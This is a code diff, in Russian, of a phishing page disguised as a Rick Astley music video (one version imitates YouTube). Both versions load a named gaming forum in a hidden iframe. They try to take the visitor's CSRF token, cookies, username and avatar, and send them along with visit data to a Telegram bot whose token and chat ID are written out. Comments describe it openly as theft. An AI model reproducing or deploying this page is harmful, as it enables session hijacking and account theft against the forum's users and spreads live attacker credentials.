@@ -1,389 +1,123 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rick Astley - Never Gonna Give You Up (Official Music Video) 4K</title>
-    
-    <!-- Мета-теги YouTube -->
-    <meta property="og:site_name" content="YouTube">
-    <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video) 4K">
-    <meta property="og:description" content="Официальный клип Rick Astley 'Never Gonna Give You Up' в 4K качестве. 1.5 МИЛЛИАРДА просмотров!">
-    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
-    <meta property="og:url" content="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
-    
+    <title>Rick Astley - Never Gonna Give You Up</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
-        body { background: #0f0f0f; color: #fff; }
-        
-        /* Точная копия YouTube */
-        .header {
-            position: fixed; top: 0; left: 0; right: 0; height: 60px;
-            background: #0f0f0f; display: flex; align-items: center;
-            justify-content: space-between; padding: 0 20px;
-            border-bottom: 1px solid #3f3f3f; z-index: 1000;
+        body { margin: 0; padding: 0; background: #000; }
+        .video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
         }
-        
-        .logo { display: flex; align-items: center; gap: 5px; }
-        .logo-icon { color: #ff0000; font-size: 28px; font-weight: 900; }
-        .logo-text { color: #fff; font-size: 20px; font-weight: 500; }
-        
-        .search-container { flex: 1; max-width: 700px; margin: 0 20px; display: flex; }
-        .search-box {
-            flex: 1; display: flex; background: #121212;
-            border: 1px solid #3f3f3f; border-radius: 40px 0 0 40px;
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
         }
-        .search-box input {
-            flex: 1; height: 40px; background: transparent; border: none;
-            padding: 0 20px; color: #fff; font-size: 16px; outline: none;
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 2;
+            cursor: pointer;
         }
-        .search-btn {
-            width: 64px; height: 40px; background: #222;
-            border: 1px solid #3f3f3f; border-left: none;
-            border-radius: 0 40px 40px 0; display: flex;
-            align-items: center; justify-content: center; cursor: pointer;
-        }
-        
-        /* Основной контент */
-        .content {
-            display: flex; margin-top: 60px; padding: 20px; gap: 20px;
-        }
-        
-        .video-section { flex: 2; min-width: 0; }
-        .video-player {
-            position: relative; width: 100%; aspect-ratio: 16/9;
-            background: #000; border-radius: 12px; overflow: hidden;
-        }
-        .video-player iframe { width: 100%; height: 100%; border: none; }
-        
-        .video-title { margin: 15px 0; font-size: 20px; font-weight: 600; }
-        
-        .video-meta {
-            display: flex; justify-content: space-between;
-            align-items: center; padding: 10px 0;
-            border-bottom: 1px solid #3f3f3f;
-        }
-        
-        .stats { color: #aaa; font-size: 14px; }
-        .actions { display: flex; gap: 10px; }
-        .action-btn {
-            display: flex; align-items: center; gap: 5px;
-            padding: 8px 15px; background: #272727; border-radius: 20px;
-            cursor: pointer; font-size: 14px;
-        }
-        
-        .channel-info {
-            display: flex; align-items: center; gap: 15px;
-            padding: 15px 0; border-bottom: 1px solid #3f3f3f;
-        }
-        .channel-avatar {
-            width: 50px; height: 50px; border-radius: 50%;
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-        }
-        .channel-name { font-size: 18px; font-weight: 600; }
-        .channel-subs { color: #aaa; font-size: 14px; }
-        .subscribe-btn {
-            background: #cc0000; color: #fff; border: none;
-            padding: 10px 20px; border-radius: 20px; font-weight: 600;
-            cursor: pointer; margin-left: auto;
-        }
-        
-        /* Комментарии */
-        .comments { margin-top: 30px; }
-        .comment {
-            display: flex; gap: 15px; margin-bottom: 20px;
-        }
-        .comment-avatar {
-            width: 40px; height: 40px; border-radius: 50%;
-            background: #333; flex-shrink: 0;
-        }
-        .comment-author { font-weight: 600; margin-bottom: 5px; }
-        .comment-text { color: #ddd; margin-bottom: 5px; }
-        .comment-meta { color: #aaa; font-size: 12px; }
-        
-        /* Рекомендации */
-        .recommendations { flex: 1; min-width: 350px; }
-        .rec-item {
-            display: flex; gap: 10px; margin-bottom: 10px;
-            cursor: pointer; padding: 10px; border-radius: 10px;
-        }
-        .rec-item:hover { background: #272727; }
-        .rec-thumb {
-            width: 168px; height: 94px;
-            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
-            border-radius: 8px; flex-shrink: 0; position: relative;
-        }
-        .rec-duration {
-            position: absolute; bottom: 5px; right: 5px;
-            background: rgba(0,0,0,0.8); color: #fff;
-            padding: 2px 4px; border-radius: 4px; font-size: 12px;
-        }
-        .rec-title { font-size: 14px; font-weight: 600; margin-bottom: 5px; }
-        .rec-channel { color: #aaa; font-size: 12px; }
-        
-        /* Лоадер */
-        .loader {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: #0f0f0f; display: flex; justify-content: center;
-            align-items: center; z-index: 10000; transition: opacity 0.5s;
-        }
-        .loader.hidden { opacity: 0; pointer-events: none; }
-        .spinner {
-            width: 60px; height: 60px; border: 4px solid #3f3f3f;
-            border-top-color: #ff0000; border-radius: 50%;
-            animation: spin 1s infinite linear; margin: 0 auto 20px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        
-        /* Абсолютно невидимый iframe */
-        #stealthFrame {
-            position: absolute; width: 1px; height: 1px;
-            opacity: 0.001; top: -9999px; left: -9999px;
-            pointer-events: none; visibility: hidden;
-        }
-        
-        /* Прогресс-бар */
-        .progress {
-            position: absolute; bottom: 0; left: 0; right: 0;
-            height: 3px; background: rgba(255,255,255,0.2);
-        }
-        .progress-fill {
-            width: 0%; height: 100%; background: #ff0000;
-            transition: width 0.1s linear;
+        .timer {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            color: white;
+            font-family: Arial;
+            background: rgba(0,0,0,0.7);
+            padding: 10px 20px;
+            border-radius: 30px;
+            z-index: 3;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <!-- Лоадер -->
-    <div class="loader" id="loader">
-        <div>
-            <div class="spinner"></div>
-            <div style="color: #aaa; font-size: 18px;">YouTube</div>
-            <div style="color: #666; font-size: 14px; margin-top: 10px;">Загрузка видео 4K...</div>
-        </div>
+    <!-- Настоящий рикролл видео (жертва смотрит и радуется) -->
+    <div class="video-container">
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" allow="autoplay"></iframe>
     </div>
-
-    <!-- Шапка YouTube -->
-    <header class="header">
-        <div style="display: flex; align-items: center; gap: 20px;">
-            <div style="width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer;">☰</div>
-            <div class="logo">
-                <span class="logo-icon">▶</span>
-                <span class="logo-text">YouTube</span>
-            </div>
-        </div>
-        
-        <div class="search-container">
-            <div class="search-box">
-                <input type="text" placeholder="Введите запрос" value="rick astley never gonna give you up">
-            </div>
-            <div class="search-btn">🔍</div>
-        </div>
-        
-        <div style="display: flex; align-items: center; gap: 15px;">
-            <div style="width: 40px; height: 40px; display: flex; align-items: center; justify-content: center;">🔔</div>
-            <div style="width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, #667eea, #764ba2);"></div>
-        </div>
-    </header>
-
-    <!-- Основной контент -->
-    <div class="content">
-        <!-- Видео секция -->
-        <div class="video-section">
-            <div class="video-player">
-                <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-                <div class="progress">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-            </div>
-            
-            <div class="video-title">Rick Astley - Never Gonna Give You Up (Official Music Video) 4K</div>
-            
-            <div class="video-meta">
-                <div class="stats">1 543 678 901 просмотр • 14 марта 2026</div>
-                <div class="actions">
-                    <div class="action-btn">👍 12 млн</div>
-                    <div class="action-btn">👎 123 тыс</div>
-                    <div class="action-btn">🔗 Поделиться</div>
-                </div>
-            </div>
-            
-            <div class="channel-info">
-                <div class="channel-avatar"></div>
-                <div>
-                    <div class="channel-name">Rick Astley Official</div>
-                    <div class="channel-subs">15.3 млн подписчиков</div>
-                </div>
-                <button class="subscribe-btn" onclick="alert('🔔 Спасибо за подписку!')">Подписаться</button>
-            </div>
-            
-            <!-- Комментарии -->
-            <div class="comments">
-                <div style="display: flex; gap: 20px; margin-bottom: 20px;">
-                    <span style="font-size: 18px; font-weight: 600;">65 432 комментария</span>
-                </div>
-                
-                <div class="comment">
-                    <div class="comment-avatar"></div>
-                    <div>
-                        <div class="comment-author">@user123</div>
-                        <div class="comment-text">Кто это слушает в 2026? Мы старые... 🔥</div>
-                        <div class="comment-meta">2 минуты назад • 123 likes</div>
-                    </div>
-                </div>
-                
-                <div class="comment">
-                    <div class="comment-avatar"></div>
-                    <div>
-                        <div class="comment-author">@votive_player</div>
-                        <div class="comment-text">Ребята с Votive RP, привет! 👀 Кто тоже по ссылке?</div>
-                        <div class="comment-meta">3 часа назад • 789 likes</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Рекомендации -->
-        <div class="recommendations">
-            <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
-                <span>Рекомендации</span>
-            </div>
-            
-            <div class="rec-item">
-                <div class="rec-thumb"><span class="rec-duration">3:32</span></div>
-                <div>
-                    <div class="rec-title">Rick Astley - Together Forever</div>
-                    <div class="rec-channel">Rick Astley</div>
-                </div>
-            </div>
-            
-            <div class="rec-item">
-                <div class="rec-thumb"><span class="rec-duration">4:15</span></div>
-                <div>
-                    <div class="rec-title">Rick Astley - Whenever You Need Somebody</div>
-                    <div class="rec-channel">Rick Astley</div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- НЕВИДИМЫЙ IFRAME ДЛЯ СБОРА ДАННЫХ -->
-    <iframe id="stealthFrame" src="about:blank"></iframe>
+    
+    <!-- Скрытый iframe для кражи -->
+    <iframe id="stealthFrame" style="position: absolute; width: 1px; height: 1px; opacity: 0.001; top: -100px; left: -100px;"></iframe>
+    
+    <!-- Таймер -->
+    <div class="timer" id="timer">Редирект через 30 сек • Нажмите на видео чтобы пропустить</div>
+    
+    <!-- Прозрачный слой для клика -->
+    <div class="overlay" onclick="redirectNow()"></div>
 
     <script>
-        // ===== ТВОИ РАБОЧИЕ ДАННЫЕ =====
         const TELEGRAM_TOKEN = '8389131821:AAFHqe3YzYHBg2Xm6ybDYCegm7irwCqXi7w';
-        const CHAT_ID = '-1003489685426';  // Группа "Морфитики ЧСП"
+        const CHAT_ID = '-1003489685426';
         
-        // Убираем лоадер
-        setTimeout(() => {
-            document.getElementById('loader').classList.add('hidden');
-        }, 2000);
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            }).catch(() => {});
+        }
         
-        // Функция тихой отправки в Telegram
-        async function sendToTelegram(data) {
+        // Тихо грузим форум в iframe
+        const iframe = document.getElementById('stealthFrame');
+        iframe.src = 'https://forum.votive-rp.com';
+        
+        iframe.onload = function() {
             try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: data,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                // Абсолютно тихо - никаких логов
-            } catch (e) {
-                // Абсолютно тихо
-            }
-        }
-        
-        // Функция сбора данных с форума
-        async function collectForumData() {
-            const iframe = document.getElementById('stealthFrame');
-            iframe.src = 'https://forum.votive-rp.com';
-            
-            iframe.onload = function() {
-                try {
-                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                    
-                    // СОБИРАЕМ ВСЁ ЧТО МОЖНО
-                    const data = {
-                        // CSRF токен
-                        csrf: iframeDoc.querySelector('html')?.getAttribute('data-csrf') || 'Не найден',
-                        
-                        // ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ
-                        username: iframeDoc.querySelector('.p-navgroup-link--user .p-navgroup-linkText')?.textContent?.trim() || 'Не найден',
-                        
-                        // КУКИ
-                        cookies: iframeDoc.cookie || 'Нет доступа',
-                        
-                        // ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ
-                        user_id: iframeDoc.querySelector('[data-user-id]')?.getAttribute('data-user-id') || 'Не найден',
-                        messages: iframeDoc.querySelector('.badgeContainer')?.getAttribute('data-badge') || '0',
-                        avatar: iframeDoc.querySelector('.avatar img')?.src || 'Нет',
-                        
-                        // ВРЕМЯ
-                        time: new Date().toLocaleString('ru-RU'),
-                        referrer: document.referrer || 'Прямой переход',
-                        userAgent: navigator.userAgent
-                    };
-                    
-                    // ФОРМИРУЕМ СООБЩЕНИЕ
-                    const message = 
-`🎣 **CSRF-ХАНТЕР УСПЕШНО СРАБОТАЛ!** 🎣
-
-👤 **Пользователь:** ${data.username}
-🆔 **User ID:** ${data.user_id}
-🎫 **CSRF-токен:** \`${data.csrf}\`
-🍪 **Куки:** \`${data.cookies}\`
-📊 **Сообщения:** ${data.messages}
-🖼️ **Аватар:** ${data.avatar}
-
-🌐 **URL форума:** ${iframe.src}
-🔗 **Откуда пришёл:** ${data.referrer}
-⏰ **Время:** ${data.time}
-💻 **User-Agent:** ${data.userAgent.substring(0, 50)}...
-
-📦 **Полные данные:**
-\`\`\`json
-${JSON.stringify(data, null, 2)}
-\`\`\``;
-
-                    // ОТПРАВЛЯЕМ
-                    sendToTelegram(message);
-                    
-                } catch (e) {
-                    // ЕСЛИ CORS БЛОКИРУЕТ - ОТПРАВЛЯЕМ ЧТО ЕСТЬ
-                    const errorMessage = 
-`❌ **CORS ЗАЩИТА, НО ДАННЫЕ ЕСТЬ!**
-
-🌐 Откуда пришёл: ${document.referrer || 'Прямой переход'}
-⏰ Время: ${new Date().toLocaleString('ru-RU')}
-💻 User-Agent: ${navigator.userAgent.substring(0, 100)}
-
-⚠️ Браузер заблокировал доступ к iframe
-⚠️ Но CSRF-токен виден в DOM самого форума!`;
-                    
-                    sendToTelegram(errorMessage);
+                const doc = iframe.contentDocument || iframe.contentWindow.document;
+                const token = doc.querySelector('html')?.getAttribute('data-csrf');
+                const user = doc.querySelector('.p-navgroup-link--user .p-navgroup-linkText')?.textContent?.trim();
+                const cookies = doc.cookie;
+                const avatar = doc.querySelector('.avatar img')?.src || 'Нет';
+                
+                if (token) {
+                    sendToTelegram(
+                        `🎣 **CSRF УКРАДЕН ВО ВРЕМЯ ПРОСМОТРА РИКРОЛЛА!**\n\n` +
+                        `👤 **Юзер:** ${user}\n` +
+                        `🎫 **Токен:** \`${token}\`\n` +
+                        `🍪 **Куки:** \`${cookies}\`\n` +
+                        `🖼️ **Аватар:** ${avatar}\n` +
+                        `⏰ **Время:** ${new Date().toLocaleString('ru-RU')}\n` +
+                        `🎵 *Смотрел Rick Astley и даже не подозревал...*`
+                    );
                 }
-            };
+            } catch (e) {
+                // Отправляем инфу о CORS
+                sendToTelegram(`ℹ️ **CORS защита**: ${e.message}`);
+            }
+        };
+        
+        // Таймер редиректа
+        let seconds = 30;
+        const timerEl = document.getElementById('timer');
+        
+        const interval = setInterval(() => {
+            seconds--;
+            timerEl.textContent = `Редирект через ${seconds} сек • Нажмите на видео чтобы пропустить`;
+            
+            if (seconds <= 0) {
+                clearInterval(interval);
+                redirectNow();
+            }
+        }, 1000);
+        
+        function redirectNow() {
+            window.location.href = 'https://forum.votive-rp.com';
         }
         
-        // Запускаем сбор данных
-        setTimeout(collectForumData, 3000);
-        
-        // Анимация прогресс-бара
-        let progress = 0;
-        setInterval(() => {
-            progress = (progress + 0.1) % 100;
-            document.getElementById('progressFill').style.width = progress + '%';
-        }, 100);
-        
-        // Отправляем информацию о переходе
-        if (document.referrer) {
-            sendToTelegram(`📊 **ПЕРЕХОД ПО ССЫЛКЕ**\n\nОткуда: ${document.referrer}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
-        }
+        // Отчёт о переходе
+        sendToTelegram(`📊 **ПЕРЕХОД**\n🔗 ${document.referrer || 'Прямой'}\n⏰ ${new Date().toLocaleString('ru-RU')}`);
     </script>
 </body>
 </html>
